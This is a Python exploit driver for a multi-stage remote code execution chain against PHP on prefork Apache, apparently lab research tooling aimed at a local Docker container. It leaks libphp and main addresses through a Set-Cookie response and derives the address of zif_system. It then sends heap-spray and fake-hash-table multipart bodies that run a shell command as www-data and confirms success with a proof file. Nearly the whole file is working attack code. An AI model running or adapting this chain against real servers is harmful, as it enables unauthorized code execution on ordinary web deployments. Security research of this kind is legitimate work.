#!/usr/bin/env python3
"""Blind-rotation full chain A1 -> B1* -> A2* -> B2* on stock prefork Apache.

The driver is deliberately blind: it uses ONLY HTTP responses (the B1
Set-Cookie leak) and the proof file produced by the target command.  It never
reads /proc, Apache logs, worker PIDs, gdb, or target-side state.  Retries are
plain independent connections; no keep-alive affinity is used.

Stage bodies are built by the repository generators/functions (pure/mk_a1.py,
pure/mk_leak_b.py, pure/cheap_oom_a.py, pure/fake_ref_b.py, pure/mk_ht.py),
read-only, unmodified.
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import socket
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_REPO = "/tmp/opencode/research/9bie_update_20261022T115026Z/code/repo"
REPO = DEFAULT_REPO


def utc() -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())


def sha(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


def read_resp(s: socket.socket, limit: int = 4 << 20) -> bytes:
    out = bytearray()
    try:
        while len(out) < limit:
            chunk = s.recv(65536)
            if not chunk:
                break
            out.extend(chunk)
    except OSError:
        pass
    return bytes(out)


def send_chunked(port: int, path: str, body: bytes, timeout: float,
                 host: str = "127.0.0.1", chunk: int = 65536) -> bytes:
    """Byte-identical framing to pure/chunked_send.py."""
    boundary = b"C" * 10
    hdr = ("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
           "Content-Type: multipart/form-data; boundary=%s\r\n"
           "Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n" %
           (path, host, port, boundary.decode())).encode()
    req = bytearray(hdr)
    for i in range(0, len(body), chunk):
        piece = body[i:i + chunk]
        req += ("%x\r\n" % len(piece)).encode() + piece + b"\r\n"
    req += b"0\r\n\r\n"
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    try:
        s.sendall(req)
        return read_resp(s)
    finally:
        s.close()


def send_plain(port: int, path: str, body: bytes, timeout: float,
               host: str = "127.0.0.1") -> bytes:
    """Byte-identical framing to pure/cheap_oom_a.py and pure/fake_ref_b.py."""
    boundary = b"C" * 10
    req = ("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
           "Content-Type: multipart/form-data; boundary=%s\r\n"
           "Content-Length: %d\r\nConnection: close\r\n\r\n" %
           (path, host, port, boundary.decode(), len(body))).encode()
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    try:
        s.sendall(req + body)
        return read_resp(s)
    finally:
        s.close()


def status_of(resp: bytes) -> str:
    return resp.split(b"\r\n", 1)[0][:80].decode("latin1", "replace")


def dummy_gets(port: int, n: int, timeout: float,
               host: str = "127.0.0.1") -> list[dict]:
    """Harmless sequential GETs used to advance prefork's accept rotation.

    Blind by construction: only the HTTP status is recorded.  The point is to
    occupy the other workers so the next POST is more likely to land on the
    child that already holds the A1/B1 state (phase mode).
    """
    rows = []
    for j in range(n):
        try:
            s = socket.create_connection((host, port), timeout=timeout)
            s.settimeout(timeout)
            s.sendall(b"GET /index.php HTTP/1.0\r\nHost: x\r\n\r\n")
            resp = read_resp(s)
            s.close()
            rows.append({"j": j, "status": status_of(resp), "bytes": len(resp)})
        except OSError as exc:
            rows.append({"j": j, "error": repr(exc)})
    return rows


def a2_body(parts: int, depth: int, fillers: int) -> bytes:
    sys.path.insert(0, os.path.join(REPO, "pure"))
    from cheap_oom_a import build_body  # noqa: E402
    return build_body(parts, depth, fillers, b"a" * 32, b"k0", b"C" * 10)


def b2_body(S: int, zif: int, cmd: str) -> bytes:
    sys.path.insert(0, os.path.join(REPO, "pure"))
    from fake_ref_b import make_spray, make_name  # noqa: E402
    from mk_ht import build as build_ht  # noqa: E402

    boundary = b"C" * 10
    vl = 384
    n1, n2 = 500, 495
    ht = build_ht(S, zif, cmd.encode(), 384)
    spray = make_spray(vl, S, 1, 0x0107, 8, 32)

    def part(name: bytes, value: bytes) -> bytes:
        return (b"--" + boundary + b"\r\nContent-Disposition: form-data; name=\"" +
                name + b"\"\r\n\r\n" + value + b"\r\n")

    body = bytearray()
    for i in range(n1):
        body += part(make_name(b"s", i, 10), spray)
    body += part(b"ht", ht)
    body += part(b"PHPSESSID", b"a" * 32)
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(n2):
        body += part(make_name(b"t", i, 10), spray)
    body += b"--" + boundary + b"--\r\n"
    return bytes(body)


def parse_leak_resp(resp: bytes) -> dict:
    sys.path.insert(0, REPO)
    import exploit  # noqa: E402
    return exploit.parse_leak(resp)


def docker(args: list[str], check: bool = False) -> subprocess.CompletedProcess:
    return subprocess.run(["docker"] + args, capture_output=True, text=True,
                          check=check)


def run_a1_b1(args, a1: bytes, b1: bytes, rec: dict, save):
    """A1 then up to N B1 attempts; whole-chain retry if the leak is unusable."""
    for ct in range(args.chain_retries):
        t0 = time.time()
        try:
            resp = send_chunked(args.port, "/index.php?q0000000=v&q0000001=v"
                                "&q0000002=v&q0000003=v&q0000004=v",
                                a1, args.timeout)
        except OSError as exc:
            rec["stages"].append({"stage": "A1", "chain_try": ct,
                                  "error": repr(exc)})
            save("a1_%d.resp" % ct, b"")
            continue
        save("a1_%d.resp" % ct, resp)
        rec["stages"].append({"stage": "A1", "chain_try": ct,
                              "status": status_of(resp), "bytes": len(resp),
                              "sha256": sha(resp),
                              "elapsed_s": round(time.time() - t0, 3)})
        for i in range(args.n_b1):
            t0 = time.time()
            try:
                resp = send_chunked(args.port, "/index.php", b1, args.timeout)
            except OSError as exc:
                rec["stages"].append({"stage": "B1", "chain_try": ct, "i": i,
                                      "error": repr(exc)})
                save("b1_%d_%d.resp" % (ct, i), b"")
                continue
            save("b1_%d_%d.resp" % (ct, i), resp)
            row = {"stage": "B1", "chain_try": ct, "i": i, "bytes": len(resp),
                   "status": status_of(resp),
                   "elapsed_s": round(time.time() - t0, 3)}
            try:
                info = parse_leak_resp(resp)
            except Exception as exc:
                row["leak"] = "miss"
                row["miss_reason"] = repr(exc)
                rec["stages"].append(row)
                continue
            row["decoded"] = info["decoded"]
            row["zdtor"] = hex(info["zdtor"])
            row["libphp"] = hex(info["lib"])
            row["buckets"] = [[hex(b), c] for b, c in info["buckets"].most_common(6)]
            row["main"] = (hex(info["main_candidates"][0])
                           if info["main_candidates"] else None)
            row["cand_counts"] = {hex(k): v for k, v in info["cand_counts"].items()}
            if not info["main_candidates"]:
                row["leak"] = "no_main_candidate"
                rec["stages"].append(row)
                continue
            delta = info["lib"] - info["main_candidates"][0]
            if not (0x1A00000 <= delta <= 0x1F00000):
                row["leak"] = "implausible_delta"
                row["delta"] = hex(delta)
                rec["stages"].append(row)
                continue
            row["leak"] = "hit"
            rec["stages"].append(row)
            return {"chain_try": ct, "i": i, "info": info,
                    "main": info["main_candidates"][0]}
    return None


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--repo", default=DEFAULT_REPO)
    ap.add_argument("--a1", required=True)
    ap.add_argument("--b1", required=True)
    ap.add_argument("--outdir", required=True)
    ap.add_argument("--attempt", type=int, required=True)
    ap.add_argument("--marker", required=True)
    ap.add_argument("--restart", default="", help="container name to restart first")
    ap.add_argument("--no-restart", action="store_true")
    ap.add_argument("--n-b1", type=int, default=5)
    ap.add_argument("--n-a2", type=int, default=5)
    ap.add_argument("--n-b2", type=int, default=5)
    ap.add_argument("--chain-retries", type=int, default=1)
    ap.add_argument("--route", choices=["broadcast", "phase", "single"],
                    default="broadcast",
                    help="broadcast: A2/B2 to n_a2/n_b2 workers; "
                         "phase: dummy GETs + single A2/B2 aimed at the A1 child; "
                         "single: one A2 then back-to-back B2 rotation")
    ap.add_argument("--route-n", type=int, default=5,
                    help="worker count for phase alignment (dummy GETs = n-1)")
    ap.add_argument("--a2-parts", type=int, default=880)
    ap.add_argument("--a2-depth", type=int, default=64)
    ap.add_argument("--a2-fillers", type=int, default=115)
    ap.add_argument("--timeout", type=float, default=600.0)
    ap.add_argument("--health", action="store_true")
    args = ap.parse_args()

    global REPO
    REPO = args.repo
    os.makedirs(args.outdir, exist_ok=True)
    rec: dict = {"attempt": args.attempt, "started": utc(), "stages": [],
                 "success": False, "marker": args.marker}
    a1 = open(args.a1, "rb").read()
    b1 = open(args.b1, "rb").read()
    rec["bodies"] = {
        "a1": {"bytes": len(a1), "sha256": sha(a1)},
        "b1": {"bytes": len(b1), "sha256": sha(b1)},
    }

    def save(name: str, data: bytes) -> str:
        p = os.path.join(args.outdir, name)
        with open(p, "wb") as fh:
            fh.write(data)
        return p

    if args.restart and not args.no_restart:
        docker(["restart", args.restart], check=True)
        time.sleep(1.5)
        for _ in range(60):
            try:
                s = socket.create_connection(("127.0.0.1", args.port), timeout=3)
                s.sendall(b"GET /index.php HTTP/1.0\r\nHost: x\r\n\r\n")
                s.recv(4096)
                s.close()
                break
            except OSError:
                time.sleep(0.5)

    proof = "/out/p1_a%d" % args.attempt
    if args.restart:
        docker(["exec", args.restart, "rm", "-f", proof], check=False)

    b1_hit = run_a1_b1(args, a1, b1, rec, save)
    if b1_hit is None:
        rec["failed_stage"] = "B1"
        _finish(args, rec)
        return 3

    main = b1_hit["main"]
    lib = b1_hit["info"]["lib"]
    S = main + 0xF8398
    zif = lib + 0x465370
    rec["S"] = hex(S)
    rec["zif_system"] = hex(zif)
    rec["b1_chain_try"] = b1_hit["chain_try"]
    rec["b1_hit_attempt"] = b1_hit["i"]

    try:
        a2 = a2_body(args.a2_parts, args.a2_depth, args.a2_fillers)
    except Exception as exc:
        rec["failed_stage"] = "A2_BUILD"
        rec["error"] = repr(exc)
        _finish(args, rec)
        return 4
    rec["bodies"]["a2"] = {"bytes": len(a2), "sha256": sha(a2)}
    rec["route"] = args.route
    if args.route == "phase":
        # Occupy the other (route_n - 1) workers, then send A2 once, hoping the
        # next accept lands on the child that already holds A1/B1 state.
        rec["route_dummies_pre_a2"] = dummy_gets(args.port, args.route_n - 1,
                                                 args.timeout)
        a2_indices = [0]
    elif args.route == "single":
        a2_indices = [0]
    else:
        a2_indices = list(range(args.n_a2))
    for i in a2_indices:
        t0 = time.time()
        try:
            resp = send_plain(args.port, "/index.php", a2, args.timeout)
        except OSError as exc:
            rec["stages"].append({"stage": "A2", "i": i, "error": repr(exc)})
            save("a2_%d.resp" % i, b"")
            continue
        save("a2_%d.resp" % i, resp)
        rec["stages"].append({"stage": "A2", "i": i, "status": status_of(resp),
                              "bytes": len(resp), "sha256": sha(resp),
                              "elapsed_s": round(time.time() - t0, 3)})

    for i in range(args.n_b2):
        if args.route == "phase":
            rec.setdefault("route_dummies_pre_b2", []).append(
                dummy_gets(args.port, args.route_n - 1, args.timeout))
        cmd = ("id>%s;echo %s_b%d>>%s;id>&2;echo %s_b%d>&2" %
               (proof, args.marker, i, proof, args.marker, i))
        try:
            body = b2_body(S, zif, cmd)
        except Exception as exc:
            rec["stages"].append({"stage": "B2", "i": i, "error": repr(exc)})
            continue
        if i == 0:
            rec["bodies"]["b2_first"] = {"bytes": len(body), "sha256": sha(body)}
            rec["b2_cmd"] = cmd
        t0 = time.time()
        try:
            resp = send_plain(args.port, "/index.php", body, args.timeout)
        except OSError as exc:
            rec["stages"].append({"stage": "B2", "i": i, "error": repr(exc)})
            save("b2_%d.resp" % i, b"")
            resp = b""
        save("b2_%d.resp" % i, resp)
        row = {"stage": "B2", "i": i, "status": status_of(resp),
               "bytes": len(resp), "sha256": sha(resp),
               "elapsed_s": round(time.time() - t0, 3)}
        time.sleep(0.7)
        found = False
        if args.restart:
            r = docker(["exec", args.restart, "cat", proof])
            if r.returncode == 0 and r.stdout:
                row["proof"] = r.stdout
                found = True
        rec["stages"].append(row)
        if found and "uid=33(www-data" in row["proof"] and args.marker in row["proof"]:
            rec["success"] = True
            rec["b2_hit_attempt"] = i
            break

    _finish(args, rec)
    return 0 if rec["success"] else 5


def _finish(args, rec) -> None:
    if args.health:
        try:
            s = socket.create_connection(("127.0.0.1", args.port), timeout=5)
            s.sendall(b"GET /index.php HTTP/1.0\r\nHost: x\r\n\r\n")
            resp = read_resp(s)
            s.close()
            rec["post_health"] = {"status": status_of(resp), "bytes": len(resp),
                                  "body": resp.split(b"\r\n\r\n", 1)[-1][:40].decode(
                                      "latin1", "replace")}
        except OSError as exc:
            rec["post_health"] = {"error": repr(exc)}
    rec["finished"] = utc()
    json.dump(rec, open(os.path.join(args.outdir, "result.json"), "w"), indent=1)


if __name__ == "__main__":
    raise SystemExit(main())
